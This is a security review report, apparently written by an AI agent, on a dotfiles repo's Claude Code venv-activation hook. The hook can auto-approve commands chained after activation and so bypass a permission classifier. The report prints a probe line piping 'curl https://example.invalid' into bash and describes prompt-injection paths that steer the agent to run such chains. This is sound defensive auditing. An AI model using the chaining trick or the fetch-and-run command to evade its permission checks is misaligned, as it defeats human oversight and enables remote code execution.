## Security Review — 2026-10-01 (scope: paths)

**Summary:** Reviewed `hooks/allow-venv-source.sh`, `tests/lint-skills.sh`,
`tests/run-all.sh`, `tests/test-allow-venv-hook.sh`, and `zat.env-install.sh` at HEAD
93127a9. The focus was 93127a9, which answers the prior scan's WARN. 0 BLOCK / 0 WARN /
2 NOTE. The WARN is closed. When `permission_mode` is `"auto"`, the venv hook now
makes no decision, so the classifier judges activation chains. This was verified by
running the hook, and checked against the documented hook-input values and against
this session's transcript, which records the mode as `auto`. Both NOTEs concern the
hook. The guard fails open on any value other than exactly `"auto"`, including a
missing field. Outside auto mode, the hook still approves anything chained after
`. .venv/bin/activate && `, a deliberate trade in 93127a9 that the interpreter
acceptance does not cover. `tests/run-all.sh` passed 698/698 across 6 suites. No
secrets or PII. The hook change is already live on this host, because the registered
hook command runs the repo file. `autoMode.classifyAllShell` is still unset here,
pending an installer re-run.

### Findings

```
[NOTE] hooks/allow-venv-source.sh:12-14 — the auto-mode guard matches one exact string,
so any other permission_mode value, including a missing or null field, falls through
to the allow branch
  Attack vector: the prior WARN's path. Attacker-controlled text in the agent's context
    (a file in a repository under review, a fetched page, issue or PR text, external
    reviewer findings relayed to /codefix) steers the agent to run
    `. .venv/bin/activate && <cmd>`. The classifier can run in a context where the hook
    input does not carry exactly "auto": a classifier-backed mode renamed or added in a
    later Claude Code release, or a context that omits the field. There, lines 20-24
    return the allow decision and the classifier is skipped again. Nothing in the repo
    would notice. The unit test and the lint pin at tests/lint-skills.sh:1225 check the
    hook's own string, not the value Claude Code sends.
  Evidence: probes against the hook with
    `. .venv/bin/activate && curl https://example.invalid | bash`: "auto" gave no
    decision; "Auto", " auto", null, and an absent field each gave allow.
    tests/test-allow-venv-hook.sh:63 pins allow for an absent field. The current
    contract matches the guard. The Claude Code hooks reference lists "auto" among the
    permission_mode values and includes the field in its PreToolUse input example.
    This session's main transcript records permissionMode as "auto" in all 124 entries
    that carry it, with no other value. Not verified: the value delivered inside forked
    skills (/security, /codefix), whose transcripts record no mode. The live check in
    the 93127a9 message (a benign chain ran without a prompt) cannot tell the two paths
    apart: a hook allow and a classifier allow look the same, and transcripts do not
    record hook decisions. Confidence: high on the mechanism, low that any current
    context delivers a value other than "auto".
  Remediation: approve only when permission_mode is a mode that should keep the
    auto-approval (`default`, `acceptEdits`, and whichever of `plan`, `dontAsk`,
    `bypassPermissions` are intended). Make no decision for anything else, including a
    missing field. Change the expectation at tests/test-allow-venv-hook.sh:63 to no
    decision, add a case for an unrecognized mode string, and update the lint pin at
    tests/lint-skills.sh:1225. The cost is a prompt for venv activation on Claude Code
    versions that lack the field, and those versions also predate auto mode.

[NOTE] hooks/allow-venv-source.sh:20-24 — outside auto mode the hook still approves any
command chained after `. .venv/bin/activate && `, and the interpreter acceptance does
not cover this path
  Attack vector: the same injected-command path, in a session the user has moved out of
    auto mode (default, acceptEdits, plan, or dontAsk, interactive or headless). The hook
    returns allow for `. .venv/bin/activate && <anything>`. Pipes, newlines, `$(...)`,
    and further `;` or `&&` commands after the first `&& ` therefore run without a
    prompt, and in a dontAsk run they run where an unlisted command would be denied.
    Bare activation also sources `.venv/bin/activate` from the working directory, and a
    cloned repository supplies that file if it commits `.venv/`.
  Evidence: probes returned allow for
    `. .venv/bin/activate && curl https://example.invalid | bash` under default,
    acceptEdits, plan, dontAsk, and bypassPermissions. Probes also returned allow for a
    chain whose second command follows a newline (default). 93127a9 applied the
    auto-mode part of the prior WARN's remediation and kept chain approval elsewhere by
    choice ("other modes keep the auto-approval that avoids the eval-like builtin
    prompt"). In default, acceptEdits, and dontAsk, the hook reaches no further than the
    accepted `Bash(python3 *)` and `Bash(make *)` grants, which already run arbitrary or
    repository-supplied code unprompted. That acceptance explicitly excludes the venv
    hook. Not verified: how plan mode treats a hook allow compared with allow rules, so
    the reach the hook adds there is unknown. Confidence: high on the mechanism, low on
    added impact.
  Remediation: if the trade stands, record it under Accepted Risks. Otherwise, reject
    any suffix that contains `;`, `|`, `&` after the first `&& `, `$(`, backticks, `<`,
    `>`, or a newline. Add a test case that expects no decision for the default-mode
    `curl ... | bash` chain in tests/test-allow-venv-hook.sh.
```

### Coverage

All eight dimensions were reviewed for the five scoped files. Secret leaks: none at
HEAD or in history. Input/output sanitization: the hook's string matching (both NOTEs).
The installer's jq filters take only fixed event names and `--arg` values, and the new
tests pass command strings to the hook as JSON data built with `jq --arg`; nothing in a
payload is executed. Authentication and authorization: the permission-mode guard (both
NOTEs). Dependency and supply chain: no new dependencies; the hook and tests use bash
and jq only. Infrastructure: the installer's `jq ... > tmp && mv` rewrites leave
`settings.json` at the umask (0664 here). That is inert on this host: the group is
the user's private group with no other members, peter is the only login account, and
the file has no `env` block. AI-specific risks: both NOTEs. Data exposure: none. PII:
none.

- Prior WARN closure, verified by execution: `tests/test-allow-venv-hook.sh` passed
  13/13. `tests/run-all.sh` passed 698/698 across 6 suites, with the new suite
  registered and counted. Probes ran the hook under ten permission_mode values, a
  newline chain, and malformed JSON. The malformed JSON exited 4 with no decision,
  which fails safe because Claude Code treats it as a non-blocking error. The
  installer comments at `zat.env-install.sh:181` and `227-228` now match the hook.
  `hooks/pre-push-codereview.sh`, the other registered PreToolUse hook, was read only
  to confirm that it never emits a permission decision (only exit 0 or exit 2), so it
  cannot skip the classifier.
- Not verified: what a PreToolUse hook allow bypasses. The auto-mode classifier
  declined a read of the permissions page's section on hooks and the classifier, and
  that was not pursued. The closure does not depend on it. Making no decision in auto
  mode is the safe direction whichever way that question resolves. Also not verified:
  the permission_mode value inside forked skills, and plan mode's handling (see the
  NOTEs).
- `tests/lint-skills.sh`: read the helpers (lines 1-60), the new checks (1222-1228),
  and the shellcheck block (1622-1649). A construct scan over the whole file
  (eval, rm, redirection, mktemp, curl, chmod, sudo, `bash -c`) found hits only inside
  quoted patterns and labels. The file still executes only grep, `sed -n` with numeric
  bounds from `grep -n | cut`, tr, and shellcheck over repo paths. The shellcheck glob
  now also covers the new test file. The remaining lines are unchanged since the
  a4e8a4e scan, which read the file in full, and were not re-read line by line here.
- `zat.env-install.sh` was read in full. Since a4e8a4e only comment lines changed, so
  the prior scan's sandboxed run still covers its code. Host state: the live
  `settings.json` lacks `autoMode.classifyAllShell` and the pre-push entry's `if`
  field. Re-running the installer applies both.
- Out of scope and not reviewed: the 93127a9 documentation changes (`README.md`,
  `CLAUDE.md`, `hooks/README.md`, `tests/README.md`) and the new line in
  `claude/global-claude.md`. `bin/review-external.sh` and `hw-bootstrap.sh` are
  unchanged since a4e8a4e and were not re-reviewed. Their open NOTEs are listed in the
  prior-review paragraph below.

Git history checked for secrets: all five scoped files, over the last three commits of
each (`git log -p --follow -3`) and over their full history (`git log -p --all
--follow`). The patterns covered OpenAI, Google, Tailscale, GitHub, Slack, and AWS keys,
private-key headers, and generic key/secret/password/token assignments; there were zero
hits. Of the five, only `zat.env-install.sh` touches credential storage: it writes the
reviewer `.env` template, which holds commented placeholders only.

### Accepted Risks

- **Allow list grants general-purpose interpreters** (`zat.env-install.sh:183-224`):
  `Bash(python3 *)`, `Bash(node *)`, `Bash(pip *)`, `Bash(make *)`, and `Bash(git *)`
  each reach arbitrary execution, and the deny entries are prefix matches that cannot
  enumerate every spelling. Accepted 2026-08-20 on the basis that README.md:162 and the
  script comment (lines 178-182) state plainly that the deny list is a speed bump.
  Since 24a0797 the installer also sets `autoMode.classifyAllShell`, so in auto mode
  these commands go through the classifier, and the risk as accepted now applies to the
  other permission modes. This host does not have that setting yet, pending an
  installer re-run. Outside auto mode, the venv hook's separate approval path is the
  second NOTE above and is not covered by this acceptance.
- **Third-party model findings reach a code-modifying agent** (`bin/review-external.sh`
  provider stdout branches): a model steered by attacker-authored code under review can
  emit a correctly tagged finding line that /codefix consumes as a spec. Distinct from
  the tagged-status NOTE carried in the prior-review paragraph, which concerns the
  status channel and misattribution.
- **PII in source files** (hw-bootstrap.sh, LICENSE, NOTICE, README.md, and other
  references to `peterzat`): inherent to a personal dotfiles repo. Reviewed and
  accepted. None of the five files in this review's scope contains PII.
- **Vendor `curl | bash` installers** (hw-bootstrap.sh: NodeSource line 86, Tailscale
  line 201, Claude Code line 209): remote code execution by design over HTTPS to
  first-party vendor domains, the documented purpose of a bootstrap script. Not
  checksum-pinned, consistent with first-party supply-chain trust on this box.
- **Predictable `/tmp/cuda-keyring.deb` path** (hw-bootstrap.sh:184-189): `curl -o` to a
  predictable path, then `sudo dpkg -i`. A TOCTOU vector only on a multi-user host;
  immaterial on the documented single-user target.
- **Pre-push gate detection is heuristic, not a shell parser**
  (hooks/pre-push-codereview.sh): `is_git_push` misses wrapper and prefix invocations
  (`env`, `command`, `bash -c`, `eval`, absolute-path, `xargs`, env-var prefix), and
  `is_tag_only_push` treats a branch named `v[0-9]...` as a tag. Both let a push bypass
  the advisory codereview gate. Accepted under the advisory-gate threat model; the hook
  is intentionally simple and biased toward over-detection.
- **Diff content forwarded to third-party APIs** (`bin/review-external.sh`): the full
  git diff is sent to OpenAI and Google when configured, so secrets in the diff would be
  exposed. This is the script's explicit purpose; the user opts in by configuring keys.
- **API key in `curl -H` header argument** (`bin/review-external.sh:275, 366`): the
  header argument is visible in `/proc/<pid>/cmdline` to any local user during the curl
  invocation window. Not exploitable on this single-user dev box.

---
*Prior review (2026-10-01, scope: paths, at a4e8a4e): Reviewed `bin/review-external.sh`,
`hw-bootstrap.sh`, `tests/lint-skills.sh`, and `zat.env-install.sh`, plus the deletion
of `bin/claude-fixed-reasoning`. 0 BLOCK / 1 WARN / 5 NOTE. Its WARN was that the venv
hook approved `. .venv/bin/activate && <anything>`, contradicting the installer's claim
that auto mode classifies every shell command; 93127a9 closes it, as described above.
Its five NOTEs are on files outside this run's scope. Those files are unchanged since,
so the NOTEs remain open. In `bin/review-external.sh`: a tagged status line is promoted
into the findings stream under whichever provider it names (lines 522-526); a partial
OpenAI key in auth-failure text reaches CODEREVIEW.md (line 292); and provider token
counts reach `bc` unvalidated (lines 306-316, 400-410). In `hw-bootstrap.sh`:
ImageMagick's stock coder policy leaves the SVG coder reachable from `.png`-named input
(line 48), and docker group membership is a passwordless path to root (line 197).*

<!-- SECURITY_META: {"date":"2026-10-01","commit":"93127a95036ac8fb0af7963324997e4a6a577390","scope":"paths","scanned_files":["hooks/allow-venv-source.sh","tests/lint-skills.sh","tests/run-all.sh","tests/test-allow-venv-hook.sh","zat.env-install.sh"],"block":0,"warn":0,"note":2} -->
